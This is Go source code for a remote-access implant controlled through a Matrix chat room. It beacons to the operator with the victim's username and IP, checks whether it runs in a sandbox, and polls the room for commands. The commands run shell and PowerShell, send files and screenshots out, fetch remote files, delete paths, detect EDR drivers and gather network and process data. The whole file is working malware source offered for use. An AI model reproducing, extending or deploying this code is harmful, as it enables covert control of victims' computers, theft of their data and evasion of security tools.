package main

import (
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// Fill this to control the Implant from Matrix Chat Room
var (
	AccessToken = ""
	HomeServer  = "https://matrix.org" // Keep default
	RoomID      = ""

	sleepDuration = 5 * time.Second // Beacon interval
)

func main() {
	//Persistence() // Adds itself to the AutoRun Registry
	AntiSandBox() // Does some checks to verify its not running inside a Virtual Machine

	initialMessage := fmt.Sprintf("Greeting, Agent ID: %s from %s :: [External IP: %s] [Process: %s\\%d] [Arch: %s]", machinePrefix, username, ip, programName, pid, architecture)

	ApiPost(initialMessage)

	executedCommands := make(map[string]bool)

	for {
		result, _ := ApiGet()
		fmt.Println(result)

		message := result
		if strings.HasPrefix(strings.ToLower(message), strings.ToLower(machinePrefix)) {
			lastmessage := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(message), strings.ToLower(machinePrefix)))

			if _, ok := executedCommands[lastmessage]; !ok {
				if strings.HasPrefix(lastmessage, "cmd ") {
					args := strings.Split(lastmessage, " ")[1:]
					cmdRes := CommandExec(args...)
					ApiPost(cmdRes)
				} else if strings.HasPrefix(lastmessage, "pwsh ") {
					args := strings.Split(lastmessage, " ")[1:]
					cmdRes := PowershellExec(args...)
					ApiPost(cmdRes)

				} else if strings.HasPrefix(lastmessage, "download ") {
					filepathEx := strings.TrimPrefix(lastmessage, "download ")
					ApiUpload(filepathEx)

				} else if strings.HasPrefix(lastmessage, "screenshot") {
					img, err := CaptureScreen()
					if err != nil {
						fmt.Println("Failed to capture screen, error: ", err)
					}

					tempDir := os.TempDir()

					filePath := fmt.Sprintf("%s/%s.png", tempDir, createRandomWord())

					f, _ := os.Create(filePath)

					err = png.Encode(f, img)
					if err != nil {
						_ = f.Close()
						continue
					}

					ApiUpload(filePath)
					go func() {
						time.Sleep(20 * time.Second)
						err = os.Remove(filePath)
						if err != nil {
							fmt.Println("Error removing screenshot png:", err)
						}
					}()

				} else if strings.HasPrefix(lastmessage, "proclist") {
					processTable := GetProcessTable()
					ApiPost(processTable)

				} else if strings.HasPrefix(lastmessage, "upload ") {
					link := strings.TrimPrefix(lastmessage, "upload ")
					var filepathCx string
					if link == "" {
						ApiPost(fmt.Sprintf("Missing link argument"))
						continue
					}

					if filepathCx == "" {
						filepathCx = os.TempDir()
					}

					err := ApiDownload(link, filepathCx)
					if err != nil {
						ApiPost(fmt.Sprintf("Error Uploading: %s", err))
					} else {
						ApiPost(fmt.Sprintf("Successfully file uploaded at: %s", filepathCx))
					}

				} else if strings.HasPrefix(lastmessage, "pwd") {
					currentDir, contents := getCurrentDir()
					currentDirEx := fmt.Sprintf("Current Directory: %s", currentDir)
					ApiPost(currentDirEx)
					for _, file := range contents {
						ApiPost(file)
					}

				} else if strings.HasPrefix(lastmessage, "dir ") {
					dirpath := strings.TrimPrefix(lastmessage, "dir ")
					dirParthEx := fmt.Sprintf("Target Directory: %s", dirpath)
					ApiPost(dirParthEx)
					ApiPost(showDir(dirpath))

				} else if strings.HasPrefix(lastmessage, "cp ") {
					cpArgs := strings.Split(strings.TrimPrefix(lastmessage, "cp "), " ")
					if len(cpArgs) != 2 {
						ApiPost("Error: Invalid arguments for cp command. Usage: cp <target_path> <new_path>")
					} else {
						targetPath := cpArgs[0]
						newPath := cpArgs[1]
						info, err := os.Stat(targetPath)
						if err != nil {
							ApiPost(fmt.Sprintf("Error: %v", err))
						} else if !info.IsDir() {
							newPath = filepath.Join(newPath, filepath.Base(targetPath))
						}
						err = CopyDir(targetPath, newPath)
						if err != nil {
							ApiPost(fmt.Sprintf("Error copying %s to %s: %v", targetPath, newPath, err))
						} else {
							ApiPost(fmt.Sprintf("Successfully copied %s to %s", targetPath, newPath))
						}
					}

				} else if strings.HasPrefix(lastmessage, "remove ") {
					dirpath := strings.TrimPrefix(lastmessage, "remove ")
					err := removePath(dirpath)
					if err != nil {
						ApiPost(fmt.Sprintf("Failed to remove %s: %v\n", dirpath, err))
					} else {
						dirParthEx := fmt.Sprintf("Target Directory removed: %s", dirpath)
						ApiPost(dirParthEx)
					}

				} else if strings.HasPrefix(lastmessage, "mkdir ") {
					args := strings.Split(strings.TrimPrefix(lastmessage, "mkdir "), " ")
					if len(args) != 2 {
						ApiPost(fmt.Sprintf("Invalid arguments. Usage: mkdir <target_path> <newdir_name>"))
					} else {
						targetPath, newDirName := args[0], args[1]
						err := createNewDir(targetPath, newDirName)
						if err != nil {
							ApiPost(fmt.Sprintf("Failed to create directory %s/%s: %v\n", targetPath, newDirName, err))
						} else {
							dirPathEx := fmt.Sprintf("Directory created: %s/%s", targetPath, newDirName)
							ApiPost(dirPathEx)
						}
					}

				} else if strings.HasPrefix(lastmessage, "cat ") {
					filePath := strings.TrimPrefix(lastmessage, "cat ")
					data, err := os.ReadFile(filePath)
					if err != nil {
						ApiPost(fmt.Sprintf("Failed to read file %s: %v\n", filePath, err))
					} else {
						fileContent := fmt.Sprintf("File content: \n \n %v", string(data))
						ApiPost(fileContent)
					}

				} else if strings.HasPrefix(lastmessage, "arp") {
					cmd := exec.Command("arp", "-a")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
					output, err := cmd.CombinedOutput()
					if err != nil {
						ApiPost(fmt.Sprintf("Failed to retrieve ARP information: %v\n", err))
					} else {
						arpInfo := fmt.Sprintf("ARP information: \n %v", string(output))
						ApiPost(arpInfo)
					}

				} else if strings.HasPrefix(lastmessage, "edrsigs") {
					matches := checkDrivers()
					if len(matches) > 0 {
						ApiPost(fmt.Sprintf("EDR driver matches found: \n %v", strings.Join(matches, ", ")))
					} else {
						ApiPost("No EDR driver matches found.")
					}

				} else if strings.HasPrefix(lastmessage, "ipconfig") {
					info := getIPConfig()
					if len(info) > 0 {
						ApiPost(fmt.Sprintf("IP configuration: \n %v", strings.Join(info, " ")))
					} else {
						ApiPost("No IP configuration found.")
					}

				} else if strings.HasPrefix(lastmessage, "listdns") {
					info := getDNSEntries()
					if len(info) > 0 {
						ApiPost(fmt.Sprintf("DNS Cache Entries: \n %v", strings.Join(info, " ")))
					} else {
						ApiPost("No DNS Cache Entries was found.")
					}

				} else if strings.HasPrefix(lastmessage, "locale") {
					info := getLocaleInfo()
					if len(info) > 0 {
						ApiPost(fmt.Sprintf("System Locale: \n %v", info))
					} else {
						ApiPost("No Locale Information was found.")
					}

				} else if strings.HasPrefix(lastmessage, "netstat") {
					netStatInfo := getNetStat()
					for _, line := range netStatInfo {
						ApiPost(line)
					}

				} else if strings.HasPrefix(lastmessage, "resources") {
					diskDrives, drivesUsage := getDiskUsage()
					for i := 0; i < len(diskDrives); i++ {
						ApiPost(fmt.Sprintf("Drive %s:\n", diskDrives[i]))
						ApiPost(fmt.Sprintf("  Total Capacity: %.2f GB\n", float64(drivesUsage[i].Total)/(1024*1024*1024)))
						ApiPost(fmt.Sprintf("  Used Space: %.2f GB\n", float64(drivesUsage[i].Used)/(1024*1024*1024)))
						ApiPost(fmt.Sprintf("  Free Space: %.2f GB\n", float64(drivesUsage[i].Free)/(1024*1024*1024)))
						ApiPost(fmt.Sprintf("  Usage: %.2f%%\n", drivesUsage[i].Capacity))
					}

					totalPhysicalMemory := getMemoryInfo()
					ApiPost(fmt.Sprintf("Total Physical Memory: %.2f GB\n", float64(totalPhysicalMemory)/(1024*1024*1024)))

				} else if strings.HasPrefix(lastmessage, "routeprint") {
					info := getRoutePrint()
					if len(info) > 0 {
						ApiPost(fmt.Sprintf("Route Print Information: \n \n %v", info))
					} else {
						ApiPost("No Route Print Information was found.")
					}

				} else if strings.HasPrefix(lastmessage, "uptime") {
					uptime := GetTickCount64()
					uptimeInSeconds := uptime / 1000
					days := uptimeInSeconds / 86400
					hours := (uptimeInSeconds % 86400) / 3600
					minutes := (uptimeInSeconds % 3600) / 60
					seconds := uptimeInSeconds % 60
					ApiPost(fmt.Sprintf("System uptime: %d days, %d hours, %d minutes, %d seconds\n", days, hours, minutes, seconds))

				} else if strings.HasPrefix(lastmessage, "listwindows") {
					windows := GetVisibleWindows()
					for _, window := range windows {
						ApiPost(fmt.Sprintf("Windows Visible: %s\n", window.Title))
					}

				} else if strings.HasPrefix(lastmessage, "sleep ") {
					parts := strings.Split(lastmessage, " ")
					seconds := parts[1]
					bitterness := parts[2]

					sleepWithBitterness(seconds, bitterness)
					ApiPost(fmt.Sprintf("Sleeping for %s (with %s%% bitterness)\n", seconds, bitterness))

				} else if strings.HasPrefix(lastmessage, "uninstall") {
					ApiPost(fmt.Sprintf("Uninstall initiated, good bye."))
					DeletePersistence()
					uninstall()

				} else if strings.HasPrefix(lastmessage, "reserved") {
					ApiPost("reserved")
				}

				executedCommands[lastmessage] = true
			}
		}

		fmt.Println("Waiting for instructions..")

		time.Sleep(sleepDuration)
	}
}
